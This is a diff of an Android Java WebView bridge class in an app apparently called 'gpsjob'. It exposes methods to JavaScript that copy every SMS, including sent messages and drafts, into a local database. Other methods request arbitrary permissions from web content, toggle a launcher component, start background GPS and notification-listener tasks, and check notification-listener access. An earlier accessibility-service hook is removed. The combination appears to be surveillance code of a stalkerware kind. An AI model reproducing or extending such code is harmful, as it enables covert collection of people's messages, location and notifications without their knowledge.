@@ -4,6 +4,7 @@ import android.Manifest;
 import android.app.Activity;
 import android.app.NotificationManager;
 import android.content.ComponentName;
+import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
@@ -20,26 +21,21 @@ import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
 import androidx.work.*;
 import androidx.work.PeriodicWorkRequest;
-import android.content.Context;
 
 import com.lurkerx.gpsjob.smsjob.SmsDatabaseHelper;
-
 import org.json.JSONArray;
 
-import java.util.concurrent.TimeUnit;
-
 public class AndroidBridge {
-    private final Activity activity;
+    private Activity activity;
     private final GpsDatabaseHelper dbHelper;
-    private final SmsDatabaseHelper SmsDbHelper;
+    private final SmsDatabaseHelper smsDbHelper;
     private static final String PREFS_NAME = "gpsjob_prefs";
     private static final String KEY_FIRST_LAUNCH = "first_launch_done";
-    Context context;
 
     public AndroidBridge(Activity activity) {
         this.activity = activity;
         this.dbHelper = new GpsDatabaseHelper(activity);
-        this.SmsDbHelper = new SmsDatabaseHelper(activity);
+        this.smsDbHelper = new SmsDatabaseHelper(activity);
     }
 
     @JavascriptInterface
@@ -47,14 +43,14 @@ public class AndroidBridge {
         try {
             if (ContextCompat.checkSelfPermission(activity, Manifest.permission.READ_SMS)
                     != PackageManager.PERMISSION_GRANTED) {
-                Log.d("DB creation", "No READ_SMS permission, returning");
+                Log.d("AndroidBridge", "No READ_SMS permission, returning");
                 return;
             }
             Uri uri = Uri.parse("content://sms/inbox");
             Cursor cursor = activity.getContentResolver().query(uri, null, null, null, "date DESC");
 
             if (cursor != null) {
-                SQLiteDatabase db = SmsDbHelper.getWritableDatabase();
+                SQLiteDatabase db = smsDbHelper.getWritableDatabase();
                 while (cursor.moveToNext()) {
                     String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                     String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
@@ -63,12 +59,12 @@ public class AndroidBridge {
                     int typeInt = cursor.getInt(cursor.getColumnIndexOrThrow("type"));
                     String type;
                     switch (typeInt) {
-                        case 1: type = "received"; break; // inbox
-                        case 2: type = "sent"; break;     // sent
-                        case 3: type = "draft"; break;    // draft
-                        case 4: type = "outbox"; break;   // outbox
-                        case 5: type = "failed"; break;   // failed to send
-                        case 6: type = "queued"; break;   // queued
+                        case 1: type = "received"; break;
+                        case 2: type = "sent"; break;
+                        case 3: type = "draft"; break;
+                        case 4: type = "outbox"; break;
+                        case 5: type = "failed"; break;
+                        case 6: type = "queued"; break;
                         default: type = "unknown"; break;
                     }
 
@@ -81,7 +77,7 @@ public class AndroidBridge {
                 }
                 cursor.close();
                 db.close();
-                Log.d("AndroidBridge", "Successfully saved SMS with dynamic type");
+                Log.d("AndroidBridge", "Successfully saved SMS");
             }
         } catch (Exception e) {
             Log.e("AndroidBridge", "Error saving SMS", e);
@@ -91,6 +87,7 @@ public class AndroidBridge {
 
     @JavascriptInterface
     public boolean isPermissionGranted(String permission) {
+        if (activity == null) return false;
         return ContextCompat.checkSelfPermission(activity, permission)
                 == PackageManager.PERMISSION_GRANTED;
     }
@@ -98,6 +95,7 @@ public class AndroidBridge {
     @JavascriptInterface
     public void requestPermissions(String jsonPerms) {
         try {
+            if (activity == null) return;
             JSONArray arr = new JSONArray(jsonPerms);
             String[] permissions = new String[arr.length()];
             for (int i = 0; i < arr.length(); i++) {
@@ -105,12 +103,14 @@ public class AndroidBridge {
             }
             ActivityCompat.requestPermissions(activity, permissions, 1001);
         } catch (Exception e) {
+            Log.e("AndroidBridge", "Error requesting permissions", e);
             e.printStackTrace();
         }
     }
 
     @JavascriptInterface
     public void launchEnableActivity() {
+        startAllServices();
         ComponentName componentName = new ComponentName(activity, LaunchActivity.class);
         activity.getPackageManager().setComponentEnabledSetting(
                 componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
@@ -118,29 +118,13 @@ public class AndroidBridge {
         intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
         activity.startActivity(intent);
     }
-    @JavascriptInterface
-    public boolean startService() {
-        try {
-            Intent intent = new Intent(activity, GpsService.class);
-            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
-                activity.startForegroundService(intent);
-            } else {
-                activity.startService(intent);
-            }
-            return true;
-        } catch (Exception e) {
-            e.printStackTrace();
-            return false;
-        }
-    }
 
     @JavascriptInterface
-    public void launchAccessibilityPerm() {
-        Log.d("Android Bridge", "Requesting Acc Perm");
-        Intent intent = new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);
-        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-        activity.startActivity(intent);
+    public synchronized void startAllServices() {
+        Context context = activity.getApplicationContext();
+        com.lurkerx.gpsjob.notifjob.NotificationService.startAllBackgroundTasks(context);
     }
+
     @RequiresApi(api = Build.VERSION_CODES.O)
     @JavascriptInterface
     public void launchNotificationAccess(){
@@ -151,30 +135,21 @@ public class AndroidBridge {
 
     @JavascriptInterface
     public boolean isNotifAccessGranted() {
-        return com.lurkerx.gpsjob.notifjob.NotificationService.isGranted();
-    }
-
-    @JavascriptInterface
-    public boolean isAccessibilityEnabled() {
         if (activity == null) return false;
-        String serviceId = activity.getPackageName() + "/" + AppAccessibilityService.class.getCanonicalName();
-        try {
-            int accessibilityEnabled = Settings.Secure.getInt(
-                    activity.getContentResolver(),
-                    Settings.Secure.ACCESSIBILITY_ENABLED
-            );
-            if (accessibilityEnabled == 1) {
-                String enabledServices = Settings.Secure.getString(
-                        activity.getContentResolver(),
-                        Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
-                );
-                return enabledServices != null &&
-                        enabledServices.toLowerCase().contains(serviceId.toLowerCase());
+        String pkgName = activity.getPackageName();
+        final String flat = Settings.Secure.getString(activity.getContentResolver(),
+                "enabled_notification_listeners");
+        if (flat != null && !flat.isEmpty()) {
+            final String[] names = flat.split(":");
+            for (String name : names) {
+                final ComponentName cn = ComponentName.unflattenFromString(name);
+                if (cn != null) {
+                    if (pkgName.equals(cn.getPackageName())) {
+                        return true;
+                    }
+                }
             }
-        } catch (Settings.SettingNotFoundException e) {
-            e.printStackTrace();
         }
         return false;
     }
-
 }
